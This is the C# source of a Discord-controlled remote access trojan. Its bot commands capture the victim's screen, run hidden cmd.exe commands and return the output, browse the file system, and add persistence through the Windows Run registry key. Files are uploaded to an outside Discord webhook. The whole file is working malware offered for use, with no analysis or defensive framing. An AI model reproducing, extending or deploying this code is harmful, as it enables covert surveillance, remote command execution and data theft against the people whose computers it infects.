using DSharpPlus.CommandsNext;
using DSharpPlus.CommandsNext.Attributes;
using System;
using System.Drawing;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using Microsoft.Win32;

namespace Discord_Rat_Base
{
    public class Commands : BaseCommandModule
    {
        [Command("Test"), Description("Test Command.")]
        public async Task Test(CommandContext ctx)
        {
            if (Channel_Check(ctx.Channel.Id) == false)
                return;
            
            await ctx.Channel.SendMessageAsync("Test");
        }

        [Command("Screenshot"), Description("Takes a Screenshot.")]
        public async Task Screenshot(CommandContext ctx)
        {
            if (Channel_Check(ctx.Channel.Id) == false)
                return;

            Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics graphics = Graphics.FromImage(bitmap);
            graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
            bitmap.Save(Settings.appConfig + @"\screen_34.png");
            SendFile(Globals.WebHook, Settings.appConfig + @"\screen_34.png");
        }

        [Command("Shell"), Description("Runs command in cmd and returns the info.")]
        public async Task Shell(CommandContext ctx, string command)
        {
            if (Channel_Check(ctx.Channel.Id) == false)
                return;

            ctx.Channel.SendMessageAsync("Shelling");
            Process process = new Process();
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/C " + command;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.Start();

            string data = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            ctx.Channel.SendMessageAsync("```" + data + "```");
        }
        [Command("Dir"), Description("Gets current directory.")]
        public async Task Dir(CommandContext ctx)
        {
            if (Channel_Check(ctx.Channel.Id) == false)
                return;

            string data = string.Join(Environment.NewLine, Directory.GetFileSystemEntries(Directory.GetCurrentDirectory(), "*", SearchOption.TopDirectoryOnly));
            if (data.Length >= 1990)
            {
                string path = Settings.appConfig + @"Dir_34.txt";
                File.WriteAllText(path, data);
                SendFile(Globals.WebHook, path);
            }
            else
            {
                await ctx.Channel.SendMessageAsync("```" + data + "```");
            }
            
        }

        [Command("Cd"), Description("Sets current directory.")]
        public async Task Cd(CommandContext ctx, string path)
        {
            if (Channel_Check(ctx.Channel.Id) == false)
                return;

            Directory.SetCurrentDirectory(path);
            string data = Directory.GetCurrentDirectory();
            await ctx.Channel.SendMessageAsync("```" + data + "```");

        }

        [Command("Exit"), Description("Closes the client.")]
        public async Task Exit(CommandContext ctx)
        {
            if (Channel_Check(ctx.Channel.Id) == false)
                return;
            await ctx.Channel.SendMessageAsync("Closing");
            Environment.Exit(0);

        }

        [Command("Startup"), Description("Sets startup to true.")]
        public async Task Startup(CommandContext ctx)
        {
            if (Channel_Check(ctx.Channel.Id) == false)
                return;

            RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            rk.SetValue("DiscordRatBase.exe", Application.ExecutablePath);

            await ctx.Channel.SendMessageAsync("Set startup to true.");
            await ctx.Channel.SendMessageAsync(rk.GetValue(Application.ProductName).ToString().ToLower());
            
        }

        [Command("Unstartup"), Description("Sets startup to false.")]
        public async Task Unstartup(CommandContext ctx)
        {
            if (Channel_Check(ctx.Channel.Id) == false)
                return;

            RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            rk.DeleteValue(Application.ProductName, false);

            await ctx.Channel.SendMessageAsync("Set startup to false.");
        }

        public bool Channel_Check(ulong channel)
        {
            if (channel == Globals.Channel)
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        public void SendFile(string url, string filepath)
        {
            HttpClient httpsclient = new HttpClient();
            MultipartFormDataContent Content = new MultipartFormDataContent();
            var file = File.ReadAllBytes(filepath);
            Content.Add(new ByteArrayContent(file, 0, file.Length), Path.GetExtension(filepath), filepath);
            httpsclient.PostAsync(url, Content).Wait();
            httpsclient.Dispose();
        }
    }
}
